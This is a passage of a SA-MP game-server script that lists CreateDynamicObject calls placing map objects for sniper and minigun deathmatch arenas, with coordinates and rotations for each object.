CreateDynamicObject(2780, -662.50793, 384.22595, -7.50000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2780, -637.86487, 383.87402, -8.50000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3505, -627.38446, 380.68652, -1.16026,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(638, -675.26044, 377.84778, 0.90797,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(638, -675.09766, 389.33319, 0.90797,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1255, -665.31757, 396.87433, 1.55044,   0.00000, 0.00000, 324.26996);
CreateDynamicObject(1255, -660.14728, 397.56363, 1.52387,   0.00000, 0.00000, 324.26697);
CreateDynamicObject(1255, -653.72418, 397.45325, 1.52417,   0.00000, 0.00000, 324.26697);
CreateDynamicObject(1255, -646.38733, 397.89886, 1.72253,   0.00000, 0.00000, 324.26697);
CreateDynamicObject(1255, -637.75293, 398.09488, 1.72200,   0.00000, 0.00000, 324.26697);
CreateDynamicObject(14651, -628.32971, 402.99432, 3.22038,   0.00000, 0.00000, 57.56500);
CreateDynamicObject(12950, -689.86090, 356.61295, 15.03122,   0.00000, 0.00000, 91.04501);
CreateDynamicObject(12950, -683.59454, 356.76764, 10.23122,   0.00000, 0.00000, 91.04370);
CreateDynamicObject(12950, -677.38940, 356.80780, 5.43123,   0.00000, 0.00000, 91.04370);
CreateDynamicObject(12950, -671.20428, 356.89673, 0.68123,   0.00000, 0.00000, 91.04370);
CreateDynamicObject(11496, -699.72260, 362.74835, 18.12501,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(4874, -699.40747, 321.50781, 21.85954,   0.00000, 0.00000, 89.04501);
CreateDynamicObject(3115, -643.05219, 383.84534, 18.02498,   179.99451, 0.00000, 0.00000);
CreateDynamicObject(3115, -664.07233, 383.77200, 18.02498,   179.99451, 0.00000, 0.00000);
//===============Sniper DM==============
CreateDynamicObject(11463, 3044.19995, -603.79999, -44.40000,   0.00000, 0.00000, 348.49701);
CreateDynamicObject(984, 3292.19995, -667.20001, 21.50000,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(983, 3285.89990, -544.70001, 21.50000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(13824, 3418.50000, -591.50000, -44.60000,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(13824, 3417.80005, -531.29999, -44.60000,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(18228, 3159.19995, -518.70001, -6.00000,   0.00000, 0.00000, 190.00000);
CreateDynamicObject(18228, 3192.39990, -505.70001, -6.00000,   0.00000, 0.00000, 169.99600);
CreateDynamicObject(18228, 3233.89990, -517.59998, -6.00000,   0.00000, 0.00000, 119.99600);
CreateDynamicObject(18228, 3270.89990, -512.50000, -6.00000,   0.00000, 0.00000, 99.99600);
CreateDynamicObject(18228, 3295.00000, -512.20001, -6.00000,   0.00000, 0.00000, 119.99600);
CreateDynamicObject(18228, 3317.89990, -537.20001, -6.00000,   0.00000, 0.00000, 129.99600);
CreateDynamicObject(18228, 3340.00000, -569.20001, -6.00000,   0.00000, 0.00000, 9.99200);
CreateDynamicObject(18228, 3328.39990, -619.40002, -6.00000,   0.00000, 0.00000, 149.98801);
CreateDynamicObject(18228, 3338.10010, -644.20001, -6.00000,   0.00000, 0.00000, 9.98800);
CreateDynamicObject(18228, 3323.30005, -678.50000, -6.00000,   0.00000, 0.00000, 339.98700);
CreateDynamicObject(18228, 3278.30005, -689.00000, -6.00000,   0.00000, 0.00000, 349.98599);
CreateDynamicObject(18228, 3245.30005, -687.90002, -6.00000,   0.00000, 0.00000, 329.98599);
CreateDynamicObject(18228, 3199.19995, -688.50000, -6.00000,   0.00000, 0.00000, 309.98199);
CreateDynamicObject(18228, 3168.89990, -683.70001, -6.00000,   0.00000, 0.00000, 359.98199);
CreateDynamicObject(18228, 3151.50000, -680.90002, -6.00000,   0.00000, 0.00000, 279.98199);
CreateDynamicObject(18228, 3128.39990, -667.59998, -6.00000,   0.00000, 0.00000, 219.98100);
CreateDynamicObject(18228, 3109.89990, -632.29999, -11.50000,   0.00000, 0.00000, 239.98000);
CreateDynamicObject(18228, 3116.39990, -590.29999, -11.50000,   0.00000, 0.00000, 239.98000);
CreateDynamicObject(18228, 3120.89990, -560.70001, -4.50000,   0.00000, 0.00000, 239.98000);
CreateDynamicObject(18228, 3134.69995, -539.20001, -4.50000,   0.00000, 0.00000, 210.03600);
CreateDynamicObject(18228, 3123.00000, -626.79999, -11.50000,   0.00000, 0.00000, 217.98000);
CreateDynamicObject(18228, 3192.00000, -523.00000, -2.90000,   0.00000, 0.00000, 159.99600);
CreateDynamicObject(18228, 3328.10010, -594.79999, -6.00000,   0.00000, 0.00000, 149.98500);
CreateDynamicObject(18228, 3139.94849, -632.34991, 5.48238,   0.00000, 0.00000, 232.98000);
CreateDynamicObject(18228, 3141.24707, -593.62555, 7.60198,   0.00000, 0.00000, 232.92000);
CreateDynamicObject(18228, 3149.86450, -558.53595, 7.60198,   0.00000, 0.00000, 198.05998);
CreateDynamicObject(18228, 3141.24707, -593.62555, 7.60198,   0.00000, 0.00000, 232.92000);
CreateDynamicObject(18228, 3183.99316, -540.17749, 7.60198,   0.00000, 0.00000, 151.02000);
CreateDynamicObject(18228, 3224.51392, -538.87469, 7.58545,   0.00000, 0.00000, 142.62022);
CreateDynamicObject(18228, 3263.82373, -540.16516, 7.58545,   0.00000, 0.00000, 143.40016);
CreateDynamicObject(18228, 3295.67163, -552.15485, 7.58545,   0.00000, 0.00000, 74.88016);
CreateDynamicObject(18228, 3305.82593, -593.27264, 7.58545,   0.00000, 0.00000, 51.18017);
CreateDynamicObject(18228, 3295.67163, -552.15485, 7.58545,   0.00000, 0.00000, 74.88016);
CreateDynamicObject(18228, 3305.55518, -631.97711, 6.37571,   0.00000, 0.00000, 51.18017);
CreateDynamicObject(18228, 3288.18262, -657.88025, 7.58545,   0.00000, 0.00000, -22.61984);
CreateDynamicObject(18228, 3245.72217, -665.46228, 7.58545,   0.00000, 0.00000, -24.77984);
CreateDynamicObject(18228, 3199.53076, -670.90332, 7.58545,   0.00000, 0.00000, -27.77985);
CreateDynamicObject(18228, 3162.79004, -665.42755, 2.53694,   0.00000, 0.00000, -59.93982);
CreateDynamicObject(18228, 3330.34473, -609.68188, -6.00000,   0.00000, 0.00000, 149.98801);
CreateDynamicObject(18228, 3347.39478, -645.17725, -6.00000,   0.00000, 0.00000, 17.36800);
CreateDynamicObject(18228, 3329.62939, -633.18909, -6.00000,   0.00000, 0.00000, 37.94801);
CreateDynamicObject(18228, 3330.35254, -583.23389, -6.00000,   0.00000, 0.00000, 149.86801);
CreateDynamicObject(18228, 3331.32642, -570.36719, -6.00000,   0.00000, 0.00000, 149.50801);
CreateDynamicObject(18228, 3308.82617, -555.52649, 1.60726,   0.00000, 0.00000, 130.11600);
CreateDynamicObject(18228, 3327.04175, -551.00604, 1.60726,   0.00000, 0.00000, 125.79599);
CreateDynamicObject(18228, 3317.14038, -533.15509, 1.60726,   0.00000, 0.00000, 125.79599);
CreateDynamicObject(19340, 3237.01660, -573.71600, 4.48528,   0.00000, 0.00000, -86.82001);
CreateDynamicObject(19340, 3215.27539, -624.93036, 4.47547,   0.00000, 0.00000, -265.92010);
CreateDynamicObject(3866, 3233.82373, -564.14899, 15.64055,   0.00000, 0.00000, -179.34004);
CreateDynamicObject(3866, 3196.99756, -587.77203, 15.63909,   0.00000, 0.00000, -179.28004);
CreateDynamicObject(3866, 3261.24951, -599.45935, 15.63909,   0.00000, 0.00000, -179.58005);
CreateDynamicObject(3887, 3178.61157, -625.13373, 16.24143,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3887, 3244.63892, -638.72009, 16.01143,   0.00000, 0.00000, 93.54000);
CreateDynamicObject(3279, 3167.36084, -568.14972, 8.07566,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3279, 3163.34473, -642.81464, 8.05038,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3279, 3288.73169, -635.92548, 8.22453,   0.00000, 0.00000, -88.62000);
CreateDynamicObject(3279, 3284.00928, -564.60095, 8.10422,   0.00000, 0.00000, -177.36000);
CreateDynamicObject(693, 3204.56274, -613.67560, 13.14758,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(693, 3241.13135, -588.70288, 13.14758,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(669, 3286.94556, -600.43793, 8.35197,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(669, 3280.85620, -613.88147, 8.35197,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(669, 3281.69385, -627.96918, 8.35197,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(693, 3187.16968, -578.46094, 13.14758,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(671, 3223.91699, -601.40527, 8.27625,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(671, 3232.74121, -601.53326, 8.37497,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(671, 3228.45996, -608.41504, 11.61328,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(672, 3223.68384, -617.81262, 9.06017,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(672, 3238.63867, -613.78351, 9.06017,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(672, 3233.92896, -628.83771, 9.06017,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(672, 3253.40015, -622.98639, 9.06017,   0.00000, 0.00000, -0.24000);
CreateDynamicObject(671, 3253.01563, -586.56238, 8.32850,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(671, 3228.44043, -590.14642, 8.29844,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(673, 3277.96533, -641.51752, 7.88669,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(673, 3271.26807, -627.70441, 7.88669,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(705, 3203.87036, -648.12158, 7.90302,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(705, 3165.88330, -586.54248, 7.90302,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(731, 3158.15869, -614.35846, 8.15087,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(731, 3188.70264, -627.31445, 8.15087,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(838, 3213.62012, -585.70532, 10.87059,   0.00000, 0.00000, 58.73999);
CreateDynamicObject(838, 3217.50000, -567.18066, 10.87059,   0.00000, 0.00000, 58.67999);
CreateDynamicObject(838, 3187.21411, -616.71185, 10.87059,   0.00000, 0.00000, 58.73999);
CreateDynamicObject(838, 3262.53687, -627.26691, 10.87059,   0.00000, 0.00000, 58.73999);
CreateDynamicObject(706, 3196.12500, -559.76056, -11.94565,   0.00000, 0.00000, -53.75999);
CreateDynamicObject(706, 3268.97900, -570.76563, -11.94565,   0.00000, 0.00000, -53.75999);
//===============Sniper DM==============
CreateDynamicObject(11541, 4079.79980, -1818.19922, 4.30000,   0.00000, 0.00000, 355.98999);
CreateDynamicObject(11541, 4167.79980, -1744.00000, 4.30000,   0.00000, 0.00000, 265.99548);
CreateDynamicObject(11541, 4259.00000, -1825.29980, 4.30000,   0.00000, 0.00000, 175.98999);
CreateDynamicObject(11541, 4173.59961, -1904.09961, 4.30000,   0.00000, 0.00000, 85.98999);
CreateDynamicObject(12814, 4219.00000, -1770.69922, 1.20000,   0.00000, 0.00000, 357.99500);
CreateDynamicObject(16685, 4202.20020, -1877.09961, 2.20000,   0.00000, 0.00000, 355.99548);
CreateDynamicObject(16685, 4143.09961, -1821.39941, 2.20000,   0.00000, 0.00000, 355.98450);
CreateDynamicObject(16685, 4158.89990, -1770.30005, 2.20000,   0.00000, 0.00000, 355.99548);
CreateDynamicObject(3098, 4212.79980, -1801.90002, 4.50000,   0.00000, 0.00000, 267.99500);
CreateDynamicObject(3098, 4153.20020, -1867.30005, 4.50000,   0.00000, 0.00000, 173.99097);
CreateDynamicObject(11442, 149.60001, 156.20000, 486.79999,   0.00000, 0.00000, 261.99597);
CreateDynamicObject(11457, 4200.50000, -1809.40002, 2.20000,   0.00000, 0.00000, 354.00000);
CreateDynamicObject(11446, 4202.89990, -1847.80005, 2.20000,   0.00000, 0.00000, 356.00000);
CreateDynamicObject(11440, 4230.00000, -1785.59961, 1.65000,   0.00000, 0.00000, 355.99548);
CreateDynamicObject(11427, 4164.39990, -1871.90002, 9.40000,   0.00000, 0.00000, 266.00000);
CreateDynamicObject(11088, 4135.20020, -1797.39941, 8.50000,   0.00000, 0.00000, 355.99548);
CreateDynamicObject(11442, 4219.20020, -1792.00000, 2.20000,   0.00000, 0.00000, 355.99048);
CreateDynamicObject(11444, 4206.70020, -1771.09998, 2.20000,   0.00000, 0.00000, 175.99548);
CreateDynamicObject(11445, 4191.39990, -1791.69995, 2.20000,   0.00000, 0.00000, 83.98950);
CreateDynamicObject(11442, 4192.39990, -1801.59998, 2.20000,   0.00000, 0.00000, 353.99548);
CreateDynamicObject(11441, 4227.00000, -1823.09961, 2.20000,   0.00000, 0.00000, 265.99548);
CreateDynamicObject(12929, 4105.20020, -1871.39941, 2.15000,   0.00000, 0.00000, 174.00000);
CreateDynamicObject(12928, 4105.20020, -1871.50000, 2.20000,   0.00000, 0.00000, 174.00000);
CreateDynamicObject(3866, 4163.10010, -1861.80005, 10.00000,   0.00000, 0.00000, 266.00000);
CreateDynamicObject(11459, 4187.70020, -1824.19995, 2.20000,   0.00000, 0.00000, 355.99548);
CreateDynamicObject(11446, 4212.79980, -1852.90002, 2.20000,   0.00000, 0.00000, 359.99548);
CreateDynamicObject(11446, 4204.60010, -1828.50000, 2.20000,   0.00000, 0.00000, 263.98999);
CreateDynamicObject(11444, 4235.70020, -1817.69995, 2.20000,   0.00000, 0.00000, 265.99548);
CreateDynamicObject(11444, 4234.60010, -1835.19995, 2.20000,   0.00000, 0.00000, 265.99548);
CreateDynamicObject(11444, 4236.10010, -1826.19995, 2.20000,   0.00000, 0.00000, 173.99548);
CreateDynamicObject(3098, 4235.39990, -1807.00000, 4.50000,   0.00000, 0.00000, 263.99500);
CreateDynamicObject(3098, 4217.00000, -1778.19922, 4.50000,   0.00000, 0.00000, 263.99048);
CreateDynamicObject(11442, 4181.50000, -1789.30005, 2.20000,   0.00000, 0.00000, 173.98999);
CreateDynamicObject(11457, 4227.50000, -1871.79980, 1.65000,   0.00000, 0.00000, 353.99597);
CreateDynamicObject(11458, 4230.50000, -1860.69995, 2.20000,   0.00000, 0.00000, 175.99097);
CreateDynamicObject(11458, 4224.50000, -1854.59998, 2.20000,   0.00000, 0.00000, 175.98999);
CreateDynamicObject(3098, 4215.60010, -1857.50000, 4.50000,   0.00000, 0.00000, 263.99048);
CreateDynamicObject(3098, 4203.89990, -1854.00000, 4.50000,   0.00000, 0.00000, 263.99048);
CreateDynamicObject(3098, 4199.70020, -1840.90002, 4.50000,   0.00000, 0.00000, 263.99048);
CreateDynamicObject(3098, 4225.10010, -1846.40002, 4.50000,   0.00000, 0.00000, 263.99048);
CreateDynamicObject(11445, 4186.39990, -1812.59998, 2.20000,   0.00000, 0.00000, 83.99500);
CreateDynamicObject(11445, 4183.60010, -1840.90002, 2.20000,   0.00000, 0.00000, 83.99048);
CreateDynamicObject(11459, 4198.00000, -1855.19995, 2.20000,   0.00000, 0.00000, 355.99548);
CreateDynamicObject(11459, 4178.29980, -1855.19995, 2.20000,   0.00000, 0.00000, 355.99548);
CreateDynamicObject(11459, 4182.60010, -1870.30005, 2.20000,   0.00000, 0.00000, 355.99548);
CreateDynamicObject(11442, 4142.10010, -1861.69995, 2.20000,   0.00000, 0.00000, 265.99548);
CreateDynamicObject(11442, 4141.70020, -1850.69922, 2.30000,   0.00000, 0.00000, 175.98999);
CreateDynamicObject(3098, 4168.89990, -1853.19995, 4.70000,   0.00000, 0.00000, 173.99048);
CreateDynamicObject(3098, 4149.29980, -1849.09998, 4.30000,   0.00000, 0.00000, 173.99048);
CreateDynamicObject(3098, 4137.20020, -1868.30005, 4.50000,   0.00000, 0.00000, 173.99048);
CreateDynamicObject(11459, 4170.39990, -1826.59998, 2.20000,   0.00000, 0.00000, 263.99048);
CreateDynamicObject(11459, 4101.10010, -1859.30005, 2.20000,   0.00000, 0.00000, 265.99048);
CreateDynamicObject(11459, 4140.00000, -1879.50000, 2.20000,   0.00000, 0.00000, 265.99048);
CreateDynamicObject(11442, 4101.39990, -1838.19995, 2.50000,   0.00000, 0.00000, 175.99548);
CreateDynamicObject(11442, 4130.70020, -1853.59998, 2.20000,   0.00000, 0.00000, 85.98999);
CreateDynamicObject(11441, 4106.39990, -1862.59998, 2.20000,   0.00000, 0.00000, 265.99548);
CreateDynamicObject(11441, 4112.10010, -1856.00000, 2.20000,   0.00000, 0.00000, 265.99548);
CreateDynamicObject(11441, 4109.00000, -1846.40002, 2.20000,   0.00000, 0.00000, 177.99548);
CreateDynamicObject(11441, 4114.00000, -1846.30005, 2.20000,   0.00000, 0.00000, 177.99500);
CreateDynamicObject(11441, 4114.39990, -1865.69995, 2.20000,   0.00000, 0.00000, 173.99500);
CreateDynamicObject(11441, 4134.10010, -1876.00000, 2.20000,   0.00000, 0.00000, 85.98999);
CreateDynamicObject(11441, 4149.50000, -1861.09998, 2.20000,   0.00000, 0.00000, 85.98999);
CreateDynamicObject(16327, 4144.89990, -1766.80005, 2.20000,   0.00000, 0.00000, 356.00000);
CreateDynamicObject(16327, 4171.39990, -1787.50000, 2.20000,   0.00000, 0.00000, 355.99548);
CreateDynamicObject(3865, 4110.79980, -1771.59998, 4.10000,   0.00000, 0.00000, 356.00000);
CreateDynamicObject(3865, 4105.20020, -1781.90002, 4.10000,   0.00000, 0.00000, 355.99548);
CreateDynamicObject(3865, 4109.79980, -1793.30005, 4.10000,   0.00000, 0.00000, 355.99548);
CreateDynamicObject(3865, 4103.70020, -1803.19995, 4.10000,   0.00000, 0.00000, 355.99548);
CreateDynamicObject(3865, 4107.60010, -1818.00000, 4.10000,   0.00000, 0.00000, 355.99548);
CreateDynamicObject(12986, 4159.79980, -1769.29980, 3.70000,   0.00000, 0.00000, 357.99500);
CreateDynamicObject(16071, 4151.50000, -1778.29980, 4.47500,   0.00000, 0.00000, 25.99915);
CreateDynamicObject(1457, 4130.60010, -1769.00000, 3.80000,   0.00000, 0.00000, 356.00000);
CreateDynamicObject(3763, 4092.89990, -1881.40002, 50.30000,   0.00000, 0.00000, 358.00000);
CreateDynamicObject(3763, 4101.39941, -1758.00000, 50.30000,   0.00000, 0.00000, 357.98950);
CreateDynamicObject(3763, 4245.89990, -1766.40002, 50.30000,   0.00000, 0.00000, 355.99500);
CreateDynamicObject(3763, 4237.20020, -1891.19995, 50.30000,   0.00000, 0.00000, 355.98999);
CreateDynamicObject(3460, 4115.00000, -1876.06543, 6.42783,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3460, 4108.15283, -1865.66565, 6.39717,   0.00000, 0.00000, 276.00000);
CreateDynamicObject(3460, 4164.41797, -1773.41943, 6.40498,   0.00000, 0.00000, 25.99854);
CreateDynamicObject(3460, 4179.61084, -1769.85632, 6.39717,   0.00000, 0.00000, 165.99365);
CreateDynamicObject(10357, 4131.54102, -1892.70972, 29.86980,   0.00000, 35.99670, 85.99500);
CreateDynamicObject(11541, 4292.40381, -1827.33496, 39.92000,   0.00000, 0.00000, 175.98999);
CreateDynamicObject(11541, 4190.64160, -1714.42383, 39.92000,   0.00000, 0.00000, 265.99548);
CreateDynamicObject(11541, 4062.69531, -1701.81506, 39.92000,   0.00000, 0.00000, 265.99548);
CreateDynamicObject(11541, 4050.37695, -1802.60547, 39.92000,   0.00000, 0.00000, 355.98450);
CreateDynamicObject(11541, 4143.62744, -1923.17981, 39.92000,   0.00000, 0.00000, 85.98999);
CreateDynamicObject(11541, 4258.00635, -1932.06604, 39.67000,   0.00000, 0.00000, 85.98999);
CreateDynamicObject(11541, 4045.27417, -1875.02515, 39.92000,   0.00000, 0.00000, 355.98999);
CreateDynamicObject(11541, 4299.94727, -1722.64380, 39.42000,   0.00000, 0.00000, 175.98999);
CreateDynamicObject(650, 4218.49707, -1829.30823, 2.17656,   0.00000, 0.00000, 80.00000);
CreateDynamicObject(650, 4216.09277, -1806.05823, 2.17656,   0.00000, 0.00000, 129.99695);
CreateDynamicObject(650, 4198.73926, -1799.56006, 2.18437,   0.00000, 0.00000, 193.99573);
CreateDynamicObject(650, 4209.38672, -1784.81885, 2.18437,   0.00000, 0.00000, 193.99109);
CreateDynamicObject(650, 4170.13721, -1772.46033, 2.18437,   0.00000, 0.00000, 193.99109);
CreateDynamicObject(650, 4168.82568, -1793.69617, 2.17656,   0.00000, 0.00000, 303.99109);
CreateDynamicObject(650, 4173.19727, -1807.17786, 2.17656,   0.00000, 0.00000, 353.98621);
CreateDynamicObject(650, 4182.21094, -1798.53833, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4192.46631, -1824.17932, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4231.88574, -1842.41907, 2.18437,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4210.13232, -1855.88672, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4209.28174, -1875.20898, 2.18437,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4221.81982, -1880.99084, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4200.63330, -1872.25940, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4163.63916, -1865.27014, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4168.38818, -1878.12988, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4178.68896, -1878.74414, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4175.60791, -1863.49487, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4150.83447, -1854.71545, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4140.51855, -1855.15161, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4134.67334, -1845.34937, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4126.56641, -1851.99963, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4131.24512, -1861.25269, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4125.16748, -1866.86829, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4115.87402, -1855.71118, 2.18437,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4099.86279, -1855.95862, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4108.30518, -1849.08374, 2.18437,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4109.14844, -1862.89404, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4103.71094, -1837.75806, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4104.00537, -1827.22156, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4144.91895, -1772.01538, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4154.01855, -1767.32959, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(650, 4179.11230, -1787.26709, 2.17656,   0.00000, 0.00000, 353.98499);
CreateDynamicObject(651, 4159.45459, -1840.49878, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(651, 4192.32764, -1842.60632, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(651, 4215.54150, -1841.78857, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(651, 4234.97266, -1840.14050, 2.18437,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(651, 4234.79980, -1813.64661, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(651, 4223.50146, -1796.55676, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(651, 4234.55029, -1778.66565, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(651, 4222.53418, -1771.10620, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4182.06396, -1800.65137, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4168.24072, -1823.59131, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4172.95508, -1847.48376, 2.18437,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4168.90820, -1843.15283, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4172.91797, -1839.19568, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4186.28906, -1846.71191, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4190.99414, -1850.80688, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4200.53271, -1859.16504, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4201.18164, -1869.26526, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4209.18164, -1874.65283, 2.18437,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4200.77539, -1872.60120, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4200.07861, -1871.89063, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4197.10889, -1873.48621, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4187.91748, -1870.55164, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4188.79736, -1860.35693, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4175.73682, -1863.89148, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4175.64697, -1862.69714, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4183.30469, -1852.89685, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4192.26465, -1843.05359, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4192.59424, -1842.44775, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4134.59619, -1844.96362, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4159.12939, -1840.31226, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4172.73291, -1806.81787, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4168.83301, -1793.87280, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4182.34717, -1798.44519, 2.33824,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4178.60840, -1786.42871, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(678, 4222.13770, -1771.26489, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3098, 4170.31006, -1766.51892, 4.47028,   0.00000, 0.00000, 263.99048);
CreateDynamicObject(684, 4160.69727, -1786.01123, 2.37297,   0.00000, 0.00000, 52.00000);
CreateDynamicObject(674, 4134.32275, -1781.49060, 1.95156,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(674, 4181.45508, -1782.94214, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(674, 4202.57959, -1784.34851, 2.18437,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(674, 4210.00244, -1769.57312, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(674, 4217.91699, -1791.88721, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(674, 4226.70166, -1814.17712, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(674, 4233.42529, -1831.13062, 2.17656,   0.00000, 0.00000, 80.00000);
CreateDynamicObject(680, 4219.62549, -1835.52380, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(680, 4207.39697, -1835.48621, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(680, 4196.31152, -1850.71216, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(680, 4170.29053, -1860.34229, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(680, 4156.15820, -1856.29712, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(680, 4134.41553, -1850.68689, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(680, 4100.48779, -1849.85010, 2.18437,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(680, 4107.51416, -1826.14429, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(680, 4104.89893, -1813.12512, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(680, 4106.25000, -1802.54407, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(680, 4107.31592, -1783.06458, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(680, 4106.70654, -1762.98730, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(680, 4138.23926, -1765.09583, 2.17656,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(680, 4151.34766, -1774.92651, 2.17656,   0.00000, 0.00000, 0.00000);
//===================Minigun Map===
CreateDynamicObject(12814, 3077.00000, -5305.60010, 18.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8149, 3091.60010, -5209.20020, 21.90000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8149, 3163.39990, -5130.20020, 21.90000,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(8149, 3170.60010, -5281.00000, 21.90000,   0.00000, 0.00000, 90.00000);
